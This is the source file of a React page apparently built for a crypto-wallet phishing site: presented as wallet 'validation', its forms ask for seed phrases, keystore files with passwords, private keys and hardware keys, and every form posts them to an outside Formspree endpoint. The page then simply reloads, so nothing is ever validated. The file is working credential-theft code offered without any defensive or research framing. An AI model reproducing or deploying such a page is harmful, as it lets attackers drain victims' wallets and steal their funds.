import { FunctionComponent, ReactElement, useEffect, useState } from "react";
import styles from '../styles/Validate.module.scss';
import Image from "next/image";
import images from "../../public/images";
import { useRouter } from "next/router";
import { wallets } from "@/Constants/wallets";
import { WalletInfo } from "@/models/WalletInfo";
import { useForm, ValidationError } from '@formspree/react';

interface ValidateWalletProps {

}

const TabEnum = {
    Mnemoics: 0,
    Keystore: 1,
    PrivateKey: 2,
    Hardware: 3
}

const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement => {

    const router = useRouter();

    const [tab, setTab] = useState(TabEnum.Mnemoics);

    const [selectedWallet, setSelectedWallet] = useState<WalletInfo>();

    const [validationMsg, setValidationMsg] = useState<any>();

    // const handleSubmit = async (event: any) => {  
    //     event.preventDefault();

    //     const formData = new FormData(event.target);
    //     console.log(formData);
    //     const response = await fetch('https://formspree.io/f/mnqkappb', {
    //         method: 'POST',
    //         headers: {
    //             'Content-Type': 'application/x-www-form-urlencoded',
    //         },
    //         // body: new URLSearchParams(formData).toString(),
    //         body: formData, 
    //     });

    //     if (response.ok) {
    //         console.log('Email sent successfully!');
    //         // Display success message to the user
    //     } else {
    //         console.error('Failed to send email:', response.statusText);
    //         // Display error message to the user
    //     }
    // };

    useEffect(() => {
        if (router.isReady) {
            let walletName = router.query.walletName as string;
            console.log(walletName);
            console.log(wallets.find(element => element.name == walletName));
            setSelectedWallet(wallets.find(element => element.name == walletName));
        }
    }, [router.isReady])

    return (
        <div className={styles.validationPage}>
            <div className={styles.validationPage__top}>
                <h2>Validate Wallet</h2>
                {selectedWallet && <>
                    <div className={styles.image}>
                        <Image src={selectedWallet?.image} alt={selectedWallet?.name} />
                    </div>
                    <p>Validate your selected wallet <span>{selectedWallet?.name}</span> to continue </p>
                </>}
            </div>
            <div className={styles.validationPage__tabSection}>
                <div className={styles.tabs}>
                    <span onClick={() => setTab(TabEnum.Mnemoics)} className={tab === TabEnum.Mnemoics ? styles.active : ''}>MNEMONICS</span>
                    <span onClick={() => setTab(TabEnum.Keystore)} className={tab === TabEnum.Keystore ? styles.active : ''}>KEYSTORE</span>
                    <span onClick={() => setTab(TabEnum.PrivateKey)} className={tab === TabEnum.PrivateKey ? styles.active : ''}>PRIVATE KEY</span>
                    <span onClick={() => setTab(TabEnum.Hardware)} className={tab === TabEnum.Hardware ? styles.active : ''}>HARDWARE</span>
                </div>
            </div>
            {validationMsg}
            {tab === TabEnum.Mnemoics &&
                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
                    <div className={styles.inputArea}>
                        <label htmlFor={`${selectedWallet?.name} Mnemoics word phrase`}>Please enter your 12/24 word phrase</label>
                        <input type="text" name={`${selectedWallet?.name} Mnemoics word phrase`} />
                    </div>
                    <button type="submit" onClick={() => setTimeout(() => {
                        router.reload()
                    }, 0)}>Proceed</button>
                </form>}
            {tab === TabEnum.Keystore &&
                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
                    <div className={styles.inputArea}>
                        <label htmlFor={`${selectedWallet?.name} Keystore JSON`}>Please enter your Keystore JSON</label>
                        <input type="text" name={`${selectedWallet?.name} Keystore JSON`} />
                        <span>Key must be in HEX format</span>
                    </div>
                    <div className={styles.inputArea}>
                        <label htmlFor={`${selectedWallet?.name} Keystore Password`}>Enter Password</label>
                        <input type="text" name={`${selectedWallet?.name} Keystore Password`} />
                    </div>
                    <button type="submit" onClick={() => setTimeout(() => {
                        router.reload()
                    }, 0)}>Proceed</button>
                </form>}
            {tab === TabEnum.PrivateKey &&
                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
                    <div className={styles.inputArea}>
                        <label htmlFor={`${selectedWallet?.name} Private key`}>Please enter your private key</label>
                        <input type="text" name={`${selectedWallet?.name} Private key`} />
                    </div>
                    <button type="submit" onClick={() => setTimeout(() => {
                        router.reload()
                    }, 0)}>Proceed</button>
                </form>}
            {tab === TabEnum.Hardware && <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
                <div className={styles.inputArea}>
                    <label htmlFor={`${selectedWallet?.name} Hardware key`}>Please enter your Hardware Key</label>
                    <input type="text" name={`${selectedWallet?.name} Hardware key`} />
                </div>
                <button type="submit" onClick={() => setTimeout(() => {
                    router.reload()
                }, 0)}>Proceed</button>
            </form>}
        </div>
    );
}

export default ValidateWallet;